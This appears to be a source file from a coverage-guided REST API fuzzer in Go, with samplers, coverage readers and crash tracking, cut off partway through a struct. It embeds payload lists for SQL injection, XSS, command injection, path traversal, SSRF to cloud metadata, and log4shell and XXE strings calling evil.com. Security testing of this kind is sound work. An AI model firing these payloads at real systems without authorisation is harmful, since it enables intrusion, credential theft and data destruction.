package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"hash/fnv"
	"html"
	"io"
	"math"
	"math/rand"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	maxRuntimeValuesPerKey   = 200
	maxRuntimeRelationsPerKV = 500
	sequenceQueueMax         = 400
	raceQueueMax             = 512
	traceDepthMax            = 4
	minSHMBitmapSize         = 65536
	defaultSHMBitmapSize     = 262144
)

var (
	reNonAlnum       = regexp.MustCompile(`[^a-z0-9]+`)
	rePathParam      = regexp.MustCompile(`\{[^/{}]+\}`)
	reWordID         = regexp.MustCompile(`([a-z][a-z0-9]{1,40})id`)
	reJSONStartObj   = regexp.MustCompile(`^\s*\{`)
	reJSONStartAny   = regexp.MustCompile(`^\s*[\[{]`)
	reAPIVersion     = regexp.MustCompile(`^/v[0-9]+/`)
	reUUIDLike       = regexp.MustCompile(`(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$`)
	reHexLong        = regexp.MustCompile(`(?i)^[0-9a-f]{16,}$`)
	reBizIDLike      = regexp.MustCompile(`(?i)^[a-z]{2,12}[-_][a-z0-9]{1,12}(?:[-_][a-z0-9]{1,12}){0,3}$`)
	reDashIDToken    = regexp.MustCompile(`(?i)^[a-z0-9]{1,20}(?:[-_][a-z0-9]{1,20}){1,6}$`)
	reAllDigits      = regexp.MustCompile(`^[0-9]{1,20}$`)
	reHTMLInputTag   = regexp.MustCompile(`(?is)<input\b[^>]*>`)
	reHTMLAttrKV     = regexp.MustCompile(`(?i)([a-z_:][a-z0-9_:\\.-]*)\s*=\s*(?:"([^"]*)"|'([^']*)')`)
	reTraceIDField   = regexp.MustCompile(`(?i)"traceid"\s*:\s*"[^"]+"`)
	reRequestIDField = regexp.MustCompile(`(?i)"requestid"\s*:\s*"[^"]+"`)
	reUUIDBody       = regexp.MustCompile(`(?i)\b[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\b`)
	reHexLongBody    = regexp.MustCompile(`(?i)\b[0-9a-f]{16,}\b`)
	reNumLongBody    = regexp.MustCompile(`\b[0-9]{6,}\b`)
)

type Config struct {
	GrammarDir                  string
	SourceDir                   string
	DictPath                    string
	TemplatesJSON               string
	RefreshTemplates            bool
	ExporterPath                string
	TimeBudgetMinutes           float64
	Concurrency                 int
	MinConcurrency              int
	MaxConcurrency              int
	AdaptiveConcurrency         bool
	AdaptiveContentType         bool
	AutoAntiForgery             bool
	AntiForgeryField            string
	AntiForgeryHeader           string
	AntiForgeryCooldown         float64
	AntiForgerySampleRate       float64
	AntiForgeryMaxTokens        int
	AntiForgeryTokenTTL         float64
	RequestTimeoutSec           float64
	MaxResponseBytes            int
	CoverageInterval            int
	CoverageBitmapSize          int
	EndpointStallReqs           int
	EndpointZeroEdgeReqs        int
	DirectSHM                   bool
	SHMPath                     string
	SHMReadMode                 string
	SkipOnCrash                 bool
	SkipEndpointOn500           bool
	SequentialBaseline          bool
	SourceAwarePriority         bool
	RaceMode                    bool
	RaceBurst                   int
	RaceProb                    float64
	CrashTriage                 bool
	CrashSignatureMode          string
	CrashSigMutation            bool
	CrashSigQueryValues         bool
	CrashReplayCount            int
	CrashReplayQueueMax         int
	CrashReplayPerEndpoint      int
	CrashReplayProb             float64
	CrashBoostRequests          int
	CrashBoostMaxPerEndpoint    int
	CrashBoostWeight            float64
	EndpointReqShareCapPct      float64
	EndpointReqCapMinReqs       int
	EndpointNoEdgeCapWeight     float64
	EndpointCrashRateMinCrashes int
	EndpointCrashRateThreshold  float64
	EndpointCrashRateWeight     float64
	ReproRuns                   int
	ReproTargetPct              float64
	ReproTimeoutSec             float64
	MinimizeCrash               bool
	MinimizeMaxProbes           int
	PocDir                      string
	TimelineDir                 string
	MultiIdentity               bool
	IdentitySampleMode          string
	NoUI                        bool
	ForceUI                     bool
	PlainUI                     bool
	UINoClear                   bool
	ASCIIUI                     bool
	UIWidth                     int
	UIIntervalSec               float64
	UIEndpointSort              string
	UIEndpointRotate            bool
	UIEndpointRotateSec         float64
	SequenceProb                float64
	SequenceMaxDepth            int
	SequenceFanout              int
	CrashFile                   string
	UniqueCrashFile             string
	SummaryFile                 string
	ReportFile                  string
	BootstrapMax                int
}

type Segment struct {
	Kind       string `json:"kind"`
	Value      string `json:"value,omitempty"`
	ValueType  string `json:"value_type,omitempty"`
	Default    string `json:"default,omitempty"`
	Quoted     bool   `json:"quoted,omitempty"`
	PayloadKey string `json:"payload_key,omitempty"`
	Name       string `json:"name,omitempty"`
}

type Template struct {
	ID        int       `json:"id"`
	RequestID string    `json:"request_id"`
	Segments  []Segment `json:"segments"`
	Reads     []string  `json:"reads"`
	Writes    []string  `json:"writes"`
}

type TemplateExport struct {
	Count     int        `json:"count"`
	Skipped   int        `json:"skipped"`
	Templates []Template `json:"templates"`
}

type EndpointStats struct {
	Method        string
	Path          string
	Reqs          int
	LastSeen      int
	ReqsSinceEdge int
	S2xx          int
	S4xx          int
	S500          int
	Logged500     int
	Filtered500   int
	S401403       int
	S5xx          int
	Logged5xx     int
	Filtered5xx   int
	NewEdges      int
}

type MutationStats struct {
	Name     string
	Attempts int
	NewEdges int
}

// MutationCategory groups related payloads for MOpt-like adaptive selection.
// Weight is adjusted at runtime: successful categories get more selection probability.
type MutationCategory struct {
	Name     string
	Payloads []string
	Attempts int
	Hits     int
	Weight   float64
}

// mutationCategories is the global registry. Initialized once in init().
var mutationCategories []*MutationCategory

func init() {
	mutationCategories = []*MutationCategory{
		{Name: "boundary", Weight: 1.0, Payloads: []string{
			"",
			"null", "undefined", "NaN", "Infinity", "-Infinity",
		}},
		{Name: "overflow", Weight: 1.0, Payloads: []string{
			strings.Repeat("A", 100),
			strings.Repeat("A", 1024),
			strings.Repeat("A", 5000),
			strings.Repeat("A", 10000),
		}},
		{Name: "sqli", Weight: 1.5, Payloads: []string{
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' UNION SELECT 1,2,3,4,5--",
			"1; SELECT SLEEP(5)--",
			"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x716b6b71,0x41,0x7162627171,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
			"' OR 1=1--",
			"admin'--",
		}},
		{Name: "xss", Weight: 1.5, Payloads: []string{
			"<script>alert(1)</script>",
			`<img src=x onerror=alert(document.domain)>`,
			`"><svg/onload=alert(1)>`,
			`javascript:alert(1)`,
			`<details open ontoggle=alert(1)>`,
			`'-alert(1)-'`,
		}},
		{Name: "cmdi", Weight: 1.5, Payloads: []string{
			"; id",
			"| cat /etc/passwd",
			"`id`",
			"$(id)",
			"; ping -c 3 127.0.0.1",
			"%0aid",
			"|| whoami",
		}},
		{Name: "path_traversal", Weight: 1.5, Payloads: []string{
			"../../../etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			`..\\..\\..\\windows\\system32\\config\\sam`,
			"....//....//....//etc/passwd",
			"..%252f..%252f..%252fetc%252fpasswd",
		}},
		{Name: "ssrf", Weight: 1.5, Payloads: []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			"http://metadata.google.internal/computeMetadata/v1/",
			"http://100.100.100.200/latest/meta-data/",
			"http://localhost/",
			"http://0.0.0.0/",
			"http://[::1]/",
			"http://127.1/",
			"http://0x7f000001/",
			"file:///etc/passwd",
			"file:///proc/self/environ",
			"dict://localhost:6379/INFO",
			"gopher://localhost:6379/_%2A1%0D%0A",
		}},
		{Name: "open_redirect", Weight: 1.0, Payloads: []string{
			"//evil.com",
			"\\/\\/evil.com",
			"https://evil.com",
			"/\\evil.com",
			"/%0d/evil.com",
		}},
		{Name: "crlf", Weight: 1.0, Payloads: []string{
			"foo\r\nX-Injected: pwned",
			"foo\r\nTransfer-Encoding: chunked\r\n",
			"foo%0d%0aX-Injected:%20pwned",
		}},
		{Name: "ssti", Weight: 1.5, Payloads: []string{
			"{{7*7}}",
			"${7*7}",
			"#{7*7}",
			"*{7*7}",
			"@(7*7)",
			"<%= 7*7 %>",
			"{{constructor.constructor('return this')()}}",
		}},
		{Name: "log4shell", Weight: 1.0, Payloads: []string{
			"${jndi:ldap://evil.com/x}",
			"${jndi:dns://evil.com/x}",
			"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/x}",
		}},
		{Name: "nosqli", Weight: 1.0, Payloads: []string{
			`{"$gt":""}`,
			`{"$ne":null}`,
			`{"$where":"sleep(5000)"}`,
			`{"$regex":".*"}`,
		}},
		{Name: "ldap", Weight: 1.0, Payloads: []string{
			"*)(uid=*))(|(uid=*",
			"admin)(&)",
		}},
		{Name: "xxe", Weight: 1.0, Payloads: []string{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`,
		}},
		{Name: "unicode", Weight: 1.0, Payloads: []string{
			"\xef\xbc\xae\xef\xbc\xaf\xef\xbc\xb2\xef\xbc\xad",
			"admin\u200b",
			"a]dmin",
		}},
	}
}

// pickMutationCategory selects a category using MOpt-style weighted random.
// Categories that find more coverage edges get higher selection probability.
func pickMutationCategory() *MutationCategory {
	total := 0.0
	for _, c := range mutationCategories {
		total += c.Weight
	}
	if total <= 0 {
		return mutationCategories[rand.Intn(len(mutationCategories))]
	}
	r := rand.Float64() * total
	for _, c := range mutationCategories {
		r -= c.Weight
		if r <= 0 {
			return c
		}
	}
	return mutationCategories[len(mutationCategories)-1]
}

// updateMutationCategoryWeights recalculates weights based on success rates.
// Called periodically from the main loop. Implements a simplified PSO/bandit:
// weight = base + bonus * (hits / attempts), so productive categories
// get up to 3x their base weight.
func updateMutationCategoryWeights() {
	for _, c := range mutationCategories {
		if c.Attempts == 0 {
			continue
		}
		hitRate := float64(c.Hits) / float64(c.Attempts)
		c.Weight = 1.0 + hitRate*4.0
	}
}

// recordMutationCategoryHit is called when a mutation label finds new edges.
func recordMutationCategoryHit(label string) {
	for _, c := range mutationCategories {
		if strings.Contains(label, "mcat_"+c.Name) {
			c.Hits++
			return
		}
	}
}

// recordMutationCategoryAttempt marks an attempt for the category in the label.
func recordMutationCategoryAttempt(label string) {
	for _, c := range mutationCategories {
		if strings.Contains(label, "mcat_"+c.Name) {
			c.Attempts++
			return
		}
	}
}

type CrashRecord struct {
	TS            string         `json:"ts"`
	ElapsedSec    string         `json:"elapsed_secs"`
	Signature     string         `json:"signature,omitempty"`
	Status        int            `json:"status_code"`
	Method        string         `json:"method"`
	Path          string         `json:"path"`
	Identity      string         `json:"identity,omitempty"`
	Mutation      string         `json:"mutation"`
	Payload       string         `json:"payload"`
	Response      string         `json:"response_body"`
	ExceptionType string         `json:"exception_type,omitempty"`
	Triage        map[string]any `json:"triage,omitempty"`
	Repro         map[string]any `json:"repro,omitempty"`
	Minimized     map[string]any `json:"minimized,omitempty"`
	PocFile       string         `json:"poc_file,omitempty"`
	TimelineFile  string         `json:"timeline_file,omitempty"`
}

type AuthBlockedState struct {
	Count  int
	Reason string
}

type TemplateMeta struct {
	Method      string
	Path        string
	Norm        string
	ContentType string
}

type EndpointContentProfile struct {
	JSON      int
	Form      int
	Multipart int
	Other     int
}

type DepInfo struct {
	Reads    map[string]struct{}
	Writes   map[string]struct{}
	IDReads  map[string]struct{}
	IDWrites map[string]struct{}
}

type Seed struct {
	TemplateID   int
	Payload      string
	EdgesFound   int
	TimesChosen  int
	Energy       float64
	MutationName string
}

type FenwickSampler struct {
	tree    []float64 // 1-based Fenwick tree
	weights []float64 // 0-based source weights
}

func NewFenwickSampler() *FenwickSampler {
	return &FenwickSampler{
		tree:    []float64{0},
		weights: []float64{},
	}
}

func (f *FenwickSampler) Len() int { return len(f.weights) }

func (f *FenwickSampler) add(i int, delta float64) {
	for i < len(f.tree) {
		f.tree[i] += delta
		i += i & -i
	}
}

func (f *FenwickSampler) Append(weight float64) {
	if weight < 0 {
		weight = 0
	}
	f.weights = append(f.weights, weight)
	f.tree = append(f.tree, 0)
	f.add(len(f.weights), weight)
}

func (f *FenwickSampler) Set(idx int, weight float64) {
	if idx < 0 || idx >= len(f.weights) {
		return
	}
	if weight < 0 {
		weight = 0
	}
	old := f.weights[idx]
	if old == weight {
		return
	}
	f.weights[idx] = weight
	f.add(idx+1, weight-old)
}

func (f *FenwickSampler) Total() float64 {
	if len(f.tree) == 0 {
		return 0
	}
	return f.prefix(len(f.weights))
}

func (f *FenwickSampler) prefix(i int) float64 {
	sum := 0.0
	for i > 0 {
		sum += f.tree[i]
		i -= i & -i
	}
	return sum
}

func (f *FenwickSampler) Pick() int {
	n := len(f.weights)
	if n == 0 {
		return -1
	}
	total := f.Total()
	if total <= 0 {
		return rand.Intn(n)
	}

	target := rand.Float64() * total
	idx := 0
	bit := 1
	for bit < len(f.tree) {
		bit <<= 1
	}
	for step := bit >> 1; step > 0; step >>= 1 {
		next := idx + step
		if next < len(f.tree) && f.tree[next] <= target {
			target -= f.tree[next]
			idx = next
		}
	}
	picked := idx
	if picked >= n {
		picked = n - 1
	}
	return picked
}

type WorkItem struct {
	TemplateID    int
	Method        string
	Path          string
	Headers       map[string]string
	Body          string
	Identity      string
	Trace         []TraceStep
	Raw           string
	MutationLabel string
	MutationName  string
	SeedIdx       int
	EpochName     string
	EpochIdx      int
	SeqDepth      int
}

type SendResult struct {
	Item          WorkItem
	Status        int
	Body          string
	Headers       map[string]string
	Latency       time.Duration
	Err           error
	CoverageDelta int    // per-request edge delta from X-Coverage-Delta response header
	ExceptionType string // .NET exception type from X-Exception-Type response header
}

type Epoch struct {
	Name     string
	Fraction float64
	Mode     string
}

type JSONLWriter struct {
	mu      sync.Mutex
	f       *os.File
	w       *bufio.Writer
	pending int
}

func NewJSONLWriter(path string) (*JSONLWriter, error) {
	if path == "" {
		return nil, errors.New("empty path")
	}
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return nil, err
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		return nil, err
	}
	return &JSONLWriter{f: f, w: bufio.NewWriterSize(f, 1<<20)}, nil
}

func (j *JSONLWriter) Write(v any) error {
	j.mu.Lock()
	defer j.mu.Unlock()
	if j == nil || j.w == nil {
		return nil
	}
	b, err := json.Marshal(v)
	if err != nil {
		return err
	}
	if _, err := j.w.Write(b); err != nil {
		return err
	}
	if err := j.w.WriteByte('\n'); err != nil {
		return err
	}
	j.pending++
	if j.pending >= 64 {
		j.pending = 0
		return j.w.Flush()
	}
	return nil
}

func (j *JSONLWriter) Flush() error {
	j.mu.Lock()
	defer j.mu.Unlock()
	if j == nil || j.w == nil {
		return nil
	}
	j.pending = 0
	return j.w.Flush()
}

func (j *JSONLWriter) Close() error {
	j.mu.Lock()
	defer j.mu.Unlock()
	if j == nil {
		return nil
	}
	if j.w != nil {
		_ = j.w.Flush()
	}
	if j.f != nil {
		return j.f.Close()
	}
	return nil
}

type DictStore struct {
	arrays     map[string][]string
	containers map[string]map[string][]string
}

func loadDict(path string) (*DictStore, error) {
	d := &DictStore{
		arrays:     map[string][]string{},
		containers: map[string]map[string][]string{},
	}
	if path == "" {
		return d, nil
	}
	buf, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var raw map[string]any
	if err := json.Unmarshal(buf, &raw); err != nil {
		return nil, err
	}
	if wrap, ok := raw["dictionaries"].(map[string]any); ok {
		raw = wrap
	}
	for k, v := range raw {
		switch tv := v.(type) {
		case []any:
			d.arrays[k] = uniqStrings(anySliceToStrings(tv))
		case map[string]any:
			inner := map[string][]string{}
			for ik, iv := range tv {
				switch iiv := iv.(type) {
				case []any:
					inner[ik] = uniqStrings(anySliceToStrings(iiv))
				default:
					inner[ik] = uniqStrings([]string{toString(iv)})
				}
			}
			d.containers[k] = inner
		default:
			d.arrays[k] = uniqStrings([]string{toString(v)})
		}
	}
	return d, nil
}

func (d *DictStore) candidatesForKey(key string) []string {
	if d == nil {
		return nil
	}
	out := make([]string, 0, 32)
	keyNorm := strings.TrimSpace(key)
	keyCanon := canonicalKey(keyNorm)

	if arr, ok := d.arrays[keyNorm]; ok {
		out = append(out, arr...)
	}
	for k, vals := range d.arrays {
		if canonicalKey(k) == keyCanon {
			out = append(out, vals...)
		}
	}
	if strings.Contains(keyNorm, ".") {
		short := keyNorm[strings.LastIndex(keyNorm, ".")+1:]
		shortCanon := canonicalKey(short)
		if arr, ok := d.arrays[short]; ok {
			out = append(out, arr...)
		}
		for k, vals := range d.arrays {
			if canonicalKey(k) == shortCanon {
				out = append(out, vals...)
			}
		}
	}

	for _, cname := range []string{
		"restler_custom_payload",
		"restler_custom_payload_unquoted",
		"restler_custom_payload_query",
		"restler_custom_payload_header",
	} {
		container := d.containers[cname]
		if container == nil {
			continue
		}
		if vals, ok := container[keyNorm]; ok {
			out = append(out, vals...)
		}
		for k, vals := range container {
			if canonicalKey(k) == keyCanon {
				out = append(out, vals...)
			}
		}
	}

	out = filterUsefulStrings(out)
	return uniqStrings(out)
}

func (d *DictStore) allIDLikeValues() []string {
	if d == nil {
		return nil
	}
	out := make([]string, 0, 64)
	for k, vals := range d.arrays {
		if strings.HasSuffix(canonicalKey(k), "id") {
			out = append(out, vals...)
		}
	}
	for _, cname := range []string{
		"restler_custom_payload",
		"restler_custom_payload_unquoted",
		"restler_custom_payload_query",
		"restler_custom_payload_header",
	} {
		container := d.containers[cname]
		for k, vals := range container {
			if strings.HasSuffix(canonicalKey(k), "id") {
				out = append(out, vals...)
			}
		}
	}
	return uniqStrings(filterUsefulStrings(out))
}

type RuntimeStore struct {
	mu        sync.RWMutex
	values    map[string][]string
	relations map[string][][2]string
	depValues map[string][]string
}

func newRuntimeStore() *RuntimeStore {
	return &RuntimeStore{
		values:    map[string][]string{},
		relations: map[string][][2]string{},
		depValues: map[string][]string{},
	}
}

func (r *RuntimeStore) addValue(key, value string) bool {
	v := normalizeValue(value)
	if !isUsefulValue(v) {
		return false
	}
	// Don't store injection payloads (SSTI, JNDI, template strings) as runtime values —
	// they would be reused in path parameters creating a garbage feedback loop in the UI.
	if strings.ContainsAny(v, "{}$") {
		return false
	}
	ck := canonicalKey(key)
	if ck == "" {
		return false
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	cur := r.values[ck]
	if contains(cur, v) {
		return false
	}
	cur = append(cur, v)
	if len(cur) > maxRuntimeValuesPerKey {
		cur = cur[len(cur)-maxRuntimeValuesPerKey:]
	}
	r.values[ck] = cur
	return true
}

func pairKey(a, b string) (string, bool, string, string) {
	ca := canonicalKey(a)
	cb := canonicalKey(b)
	if ca == "" || cb == "" || ca == cb {
		return "", false, "", ""
	}
	if ca <= cb {
		return ca + "|" + cb, true, ca, cb
	}
	return cb + "|" + ca, false, cb, ca
}

func (r *RuntimeStore) addRelation(keyA, valueA, keyB, valueB string) bool {
	va := normalizeValue(valueA)
	vb := normalizeValue(valueB)
	if !isUsefulValue(va) || !isUsefulValue(vb) {
		return false
	}
	pk, asc, ca, cb := pairKey(keyA, keyB)
	if pk == "" {
		return false
	}
	p := [2]string{va, vb}
	if !asc {
		p = [2]string{vb, va}
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	cur := r.relations[pk]
	for _, e := range cur {
		if e == p {
			return false
		}
	}
	cur = append(cur, p)
	if len(cur) > maxRuntimeRelationsPerKV {
		cur = cur[len(cur)-maxRuntimeRelationsPerKV:]
	}
	r.relations[pk] = cur
	_ = ca
	_ = cb
	return true
}

func (r *RuntimeStore) addDepValue(depName, value string) {
	v := normalizeValue(value)
	if !isUsefulValue(v) {
		return
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	cur := r.depValues[depName]
	if contains(cur, v) {
		return
	}
	cur = append(cur, v)
	if len(cur) > maxRuntimeValuesPerKey {
		cur = cur[len(cur)-maxRuntimeValuesPerKey:]
	}
	r.depValues[depName] = cur
}

func (r *RuntimeStore) getDepValue(depName string) string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	vals := r.depValues[depName]
	if len(vals) == 0 {
		return ""
	}
	return vals[rand.Intn(len(vals))]
}

func (r *RuntimeStore) valuesForKey(key string) []string {
	ck := canonicalKey(key)
	if ck == "" {
		return nil
	}
	r.mu.RLock()
	defer r.mu.RUnlock()
	vals := r.values[ck]
	out := make([]string, len(vals))
	copy(out, vals)
	return out
}

func (r *RuntimeStore) allIDLikeValues() []string {
	r.mu.RLock()
	defer r.mu.RUnlock()
	out := make([]string, 0, 64)
	for k, vals := range r.values {
		if strings.HasSuffix(k, "id") {
			out = append(out, vals...)
		}
	}
	return uniqStrings(filterUsefulStrings(out))
}

func (r *RuntimeStore) pickCorrelated(keys []string) map[string]string {
	canonToOrig := map[string]string{}
	canonKeys := make([]string, 0, len(keys))
	for _, k := range keys {
		ck := canonicalKey(k)
		if ck == "" {
			continue
		}
		if _, ok := canonToOrig[ck]; !ok {
			canonToOrig[ck] = k
			canonKeys = append(canonKeys, ck)
		}
	}
	if len(canonKeys) < 2 {
		return nil
	}
	r.mu.RLock()
	defer r.mu.RUnlock()

	bestKey := ""
	bestLen := 0
	for i := 0; i < len(canonKeys); i++ {
		for j := i + 1; j < len(canonKeys); j++ {
			a, b := canonKeys[i], canonKeys[j]
			pk, _, _, _ := pairKey(a, b)
			bucket := r.relations[pk]
			if len(bucket) > bestLen {
				bestLen = len(bucket)
				bestKey = pk
			}
		}
	}
	if bestKey == "" || bestLen == 0 {
		return nil
	}
	parts := strings.Split(bestKey, "|")
	if len(parts) != 2 {
		return nil
	}
	bucket := r.relations[bestKey]
	pick := bucket[rand.Intn(len(bucket))]
	out := map[string]string{}
	out[canonToOrig[parts[0]]] = pick[0]
	out[canonToOrig[parts[1]]] = pick[1]
	return out
}

func (r *RuntimeStore) customPayloadCandidates(key string, dict *DictStore) []string {
	keyNorm := strings.TrimSpace(key)
	keyCanon := canonicalKey(keyNorm)
	out := make([]string, 0, 64)

	out = append(out, r.valuesForKey(keyNorm)...)
	if strings.Contains(keyNorm, ".") {
		short := keyNorm[strings.LastIndex(keyNorm, ".")+1:]
		out = append(out, r.valuesForKey(short)...)
	}
	out = append(out, dict.candidatesForKey(keyNorm)...)

	if strings.HasSuffix(keyCanon, "id") {
		out = append(out, r.allIDLikeValues()...)
		out = append(out, dict.allIDLikeValues()...)
		for i := 0; i < 3; i++ {
			out = append(out, mutateBusinessID(r.allIDLikeValues()))
		}
	}
	out = filterUsefulStrings(out)
	out = uniqStrings(out)
	return out
}

func (r *RuntimeStore) pickCustomPayloadValue(key string, dict *DictStore, fallback string) string {
	cands := r.customPayloadCandidates(key, dict)
	if len(cands) > 0 {
		return cands[rand.Intn(len(cands))]
	}
	if fallback != "" {
		return fallback
	}
	return "CUSTOM_PAYLOAD"
}

func (r *RuntimeStore) pickDynamic(depName string, dict *DictStore) (string, string) {
	if v := r.getDepValue(depName); v != "" {
		return v, "dep_known"
	}
	for _, k := range inferDependencyKeys(depName) {
		cands := r.customPayloadCandidates(k, dict)
		if len(cands) > 0 {
			return cands[rand.Intn(len(cands))], "dep_" + k
		}
	}
	return "1", "dep_default"
}

type CoverageReader interface {
	Init() error
	GetEdges() (int, error)
	Reset() error
	Capacity() int
	Close() error
}

type HTTPCoverageReader struct {
	client   *http.Client
	shmHost  string
	capacity int
}

func (h *HTTPCoverageReader) Init() error {
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(h.shmHost, "/")+"/shm/create", nil)
	if err != nil {
		return err
	}
	resp, err := h.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		return fmt.Errorf("/shm/create status=%d body=%s", resp.StatusCode, string(b))
	}
	var payload map[string]any
	if err := json.NewDecoder(io.LimitReader(resp.Body, 1<<20)).Decode(&payload); err == nil {
		if sz := toInt(payload["size"]); sz > 0 {
			h.capacity = sz
		}
	}
	return nil
}

func (h *HTTPCoverageReader) GetEdges() (int, error) {
	req, err := http.NewRequest(http.MethodGet, strings.TrimRight(h.shmHost, "/")+"/shm/coverage", nil)
	if err != nil {
		return 0, err
	}
	resp, err := h.client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("/shm/coverage status=%d", resp.StatusCode)
	}
	var payload map[string]any
	if err := json.NewDecoder(io.LimitReader(resp.Body, 1<<20)).Decode(&payload); err != nil {
		return 0, err
	}
	if h.capacity <= 0 {
		if sz := toInt(payload["size"]); sz > 0 {
			h.capacity = sz
		}
	}
	return toInt(payload["edges"]), nil
}

func (h *HTTPCoverageReader) Reset() error {
	req, err := http.NewRequest(http.MethodPost, strings.TrimRight(h.shmHost, "/")+"/shm/reset", nil)
	if err != nil {
		return err
	}
	resp, err := h.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("/shm/reset status=%d", resp.StatusCode)
	}
	return nil
}

func (h *HTTPCoverageReader) Capacity() int { return h.capacity }

func (h *HTTPCoverageReader) Close() error { return nil }

type SHMCoverageReader struct {
	path       string
	size       int
	mode       string
	f          *os.File
	mapSize    int
	mem        []byte
	readBuf    []byte
	activeMode string
	seen       []byte
	edges      int
}

func (s *SHMCoverageReader) Init() error {
	desired := maxInt(minSHMBitmapSize, s.size)
	deadline := time.Now().Add(30 * time.Second)
	for {
		fi, err := os.Stat(s.path)
		if err == nil && fi.Size() >= minSHMBitmapSize {
			break
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("shm file not ready: %s", s.path)
		}
		time.Sleep(500 * time.Millisecond)
	}
	f, err := os.OpenFile(s.path, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	fi, err := f.Stat()
	if err != nil {
		_ = f.Close()
		return err
	}
	mapSize := int(fi.Size())
	if desired > 0 && mapSize > desired {
		mapSize = desired
	}
	if mapSize < minSHMBitmapSize {
		_ = f.Close()
		return fmt.Errorf("shm file too small: %d bytes (need at least %d)", mapSize, minSHMBitmapSize)
	}
	s.f = f
	s.mapSize = mapSize
	s.activeMode = "file"
	if s.shouldUseMmap() {
		mem, err := syscall.Mmap(int(f.Fd()), 0, mapSize, syscall.PROT_READ, syscall.MAP_SHARED)
		if err == nil {
			s.mem = mem
			s.activeMode = "mmap"
		}
	}
	if len(s.mem) == 0 {
		s.readBuf = make([]byte, mapSize)
	}
	s.seen = make([]byte, mapSize)
	s.edges = 0
	return nil
}

func (s *SHMCoverageReader) GetEdges() (int, error) {
	if s.f == nil || s.mapSize <= 0 {
		return 0, errors.New("shm not initialized")
	}
	buf := s.mem
	if len(buf) == 0 {
		if len(s.readBuf) != s.mapSize {
			s.readBuf = make([]byte, s.mapSize)
		}
		n, err := s.f.ReadAt(s.readBuf, 0)
		if err != nil && !errors.Is(err, io.EOF) {
			return 0, err
		}
		if n <= 0 {
			return s.edges, nil
		}
		buf = s.readBuf[:n]
	}
	if len(s.seen) != len(buf) {
		s.seen = make([]byte, len(buf))
		s.edges = 0
	}
	for i, b := range buf {
		if b != 0 && s.seen[i] == 0 {
			s.seen[i] = 1
			s.edges++
		}
	}
	return s.edges, nil
}

func (s *SHMCoverageReader) Reset() error {
	if s.f == nil {
		return errors.New("shm not initialized")
	}
	// Zero the actual SHM file so the .NET side starts fresh too.
	zeros := make([]byte, s.mapSize)
	if _, err := s.f.WriteAt(zeros, 0); err != nil {
		return fmt.Errorf("shm file zero failed: %w", err)
	}
	_ = s.f.Sync()
	if len(s.seen) > 0 {
		for i := range s.seen {
			s.seen[i] = 0
		}
	}
	s.edges = 0
	return nil
}

func (s *SHMCoverageReader) Capacity() int { return s.mapSize }

func (s *SHMCoverageReader) Close() error {
	if len(s.mem) > 0 {
		_ = syscall.Munmap(s.mem)
	}
	if s.f != nil {
		return s.f.Close()
	}
	return nil
}

func (s *SHMCoverageReader) shouldUseMmap() bool {
	mode := strings.ToLower(strings.TrimSpace(s.mode))
	switch mode {
	case "mmap":
		return runtime.GOOS == "linux"
	case "auto":
		// Keep auto conservative: mmap only when explicitly allowed.
		return runtime.GOOS == "linux" && strings.TrimSpace(os.Getenv("SMART_FUZZER_SHM_MMAP")) == "1"
	default:
		return false
	}
}

func (s *SHMCoverageReader) ActiveMode() string {
	if strings.TrimSpace(s.activeMode) == "" {
		return "file"
	}
	return s.activeMode
}

type Fuzzer struct {
	cfg            Config
	target         string
	shm            string
	token          string
	authHeaders    map[string]string
	identities     []AuthIdentity
	identityOrder  []string
	identityCursor int

	client   *http.Client
	coverage CoverageReader

	templates []Template
	tmplByID  map[int]*Template
	meta      map[int]TemplateMeta
	activeIDs []int
	tmplEPKey map[int]string

	depIndex         map[int]DepInfo
	depConsumers     map[string][]int
	idConsumers      map[string][]int
	templatePriority map[int]float64

	runtime       *RuntimeStore
	dict          *DictStore
	sequenceQueue []WorkItem
	raceQueue     []WorkItem
	corpus        []Seed
	seedSampler   *FenwickSampler

	endpointStats map[string]*EndpointStats
	mutationStats map[string]*MutationStats
	authBlocked   map[string]*AuthBlockedState
	clientSamples map[string][]string

	startTime        time.Time
	startEdges       int
	currentEdges     int
	coverageCapacity int
	totalDone        int
	totalSent        int
	totalErrors      int
	totalCrashes     int
	uniqueCrashes    int
